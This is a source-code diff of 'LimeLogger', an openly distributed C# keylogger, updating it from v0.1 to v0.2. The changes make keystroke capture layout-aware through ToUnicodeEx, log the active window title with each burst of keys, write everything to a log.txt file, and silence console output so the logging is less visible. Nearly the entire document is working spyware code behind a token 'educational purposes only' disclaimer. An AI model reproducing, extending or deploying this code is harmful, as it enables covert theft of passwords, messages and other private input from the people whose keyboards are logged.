@@ -7,7 +7,7 @@ using System.Windows.Forms;
 
 
 //       │ Author     : NYAN CAT
-//       │ Name       : LimeLogger v0.1
+//       │ Name       : LimeLogger v0.2
 //       │ Contact    : https://github.com/NYAN-x-CAT
 
 //       This program is distributed for educational purposes only.
@@ -17,6 +17,7 @@ namespace LimeLogger
 {
     class Program
     {
+        private static readonly string loggerPath = Application.StartupPath + @"\log.txt";
 
         public static void Main()
         {
@@ -42,25 +43,19 @@ namespace LimeLogger
                 int vkCode = Marshal.ReadInt32(lParam);
                 string currentKey = null;
                 bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
-                currentKey = ((Keys)vkCode).ToString();
+                currentKey = KeyboardLayout((uint)vkCode);
 
                 if ((Keys)vkCode >= Keys.A && (Keys)vkCode <= Keys.Z)
                 {
                     if (CapsLock)
                     {
-                        currentKey = ((Keys)vkCode).ToString().ToUpper();
+                        currentKey = KeyboardLayout((uint)vkCode).ToUpper();
                     }
                     else
                     {
-                        currentKey = ((Keys)vkCode).ToString().ToLower();
+                        currentKey = KeyboardLayout((uint)vkCode).ToLower();
                     }
                 }
-
-                else if ((Keys)vkCode >= Keys.D0 && (Keys)vkCode <= Keys.D9)
-                    currentKey = Convert.ToString((Keys)vkCode).Replace("D", null);
-
-                else if ((Keys)vkCode >= Keys.NumPad0 && (Keys)vkCode <= Keys.NumPad9)
-                    currentKey = Convert.ToString((Keys)vkCode).Replace("NumPad", null);
 
                 else if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                     currentKey = "[" + (Keys)vkCode + "]";
@@ -69,12 +64,6 @@ namespace LimeLogger
                 {
                     switch (((Keys)vkCode).ToString())
                     {
-                        case "OemPeriod":
-                            currentKey = ".";
-                            break;
-                        case "Oemcomma":
-                            currentKey = ",";
-                            break;
                         case "Space":
                             currentKey = "[SPACE]";
                             break;
@@ -85,10 +74,10 @@ namespace LimeLogger
                             currentKey = "[ESC]";
                             break;
                         case "LControlKey":
-                            currentKey = "[Control]";
+                            currentKey = "[CTRL]";
                             break;
                         case "RControlKey":
-                            currentKey = "[Control]";
+                            currentKey = "[CTRL]";
                             break;
                         case "RShiftKey":
                             currentKey = "[Shift]";
@@ -105,21 +94,6 @@ namespace LimeLogger
                         case "Tab":
                             currentKey = "[Tab]";
                             break;
-                        case "Divide":
-                            currentKey = "[/]";
-                            break;
-                        case "Multiply":
-                            currentKey = "[*]";
-                            break;
-                        case "Subtract":
-                            currentKey = "[-]";
-                            break;
-                        case "Add":
-                            currentKey = "[+]";
-                            break;
-                        case "Decimal":
-                            currentKey = "[.]";
-                            break;
                         case "Capital":
                             if (CapsLock == true)
                                 currentKey = "[CAPSLOCK: OFF]";
@@ -130,18 +104,18 @@ namespace LimeLogger
                     }
                 }
 
-                using (StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true))
+                using (StreamWriter sw = new StreamWriter(loggerPath, true))
                 {
                     if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                     {
-                        Console.Write(currentKey);
+                        //Console.Write(currentKey);
                         sw.Write(currentKey);
                     }
                     else
                     {
-                        Console.WriteLine(Environment.NewLine);
-                        Console.WriteLine($"###  {GetActiveWindowTitle()} ###");
-                        Console.Write(currentKey);
+                        //Console.WriteLine(Environment.NewLine);
+                        //Console.WriteLine($"###  {GetActiveWindowTitle()} ###");
+                        //Console.Write(currentKey);
                         sw.WriteLine(Environment.NewLine);
                         sw.WriteLine($"###  {GetActiveWindowTitle()} ###");
                         sw.Write(currentKey);
@@ -150,6 +124,22 @@ namespace LimeLogger
 
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        private static string KeyboardLayout(uint vkCode)
+        {
+            try
+            {
+                StringBuilder sb = new StringBuilder();
+                byte[] vkBuffer = new byte[256];
+                if (!GetKeyboardState(vkBuffer)) return "";
+                uint scanCode = MapVirtualKey(vkCode, 0);
+                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
+                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
+                return sb.ToString();
+            }
+            catch { }
+            return ((Keys)vkCode).ToString();
         }
 
         private static string GetActiveWindowTitle()
@@ -223,11 +213,22 @@ namespace LimeLogger
         static extern IntPtr GetForegroundWindow();
         private static string CurrentActiveWindowTitle;
 
-        [DllImport("user32.dll")]
-        public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
         public static extern short GetKeyState(int keyCode);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool GetKeyboardState(byte[] lpKeyState);
+        [DllImport("user32.dll")]
+        static extern IntPtr GetKeyboardLayout(uint idThread);
+        [DllImport("user32.dll")]
+        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
+        [DllImport("user32.dll")]
+        static extern uint MapVirtualKey(uint uCode, uint uMapType);
+
         #endregion
 
     }
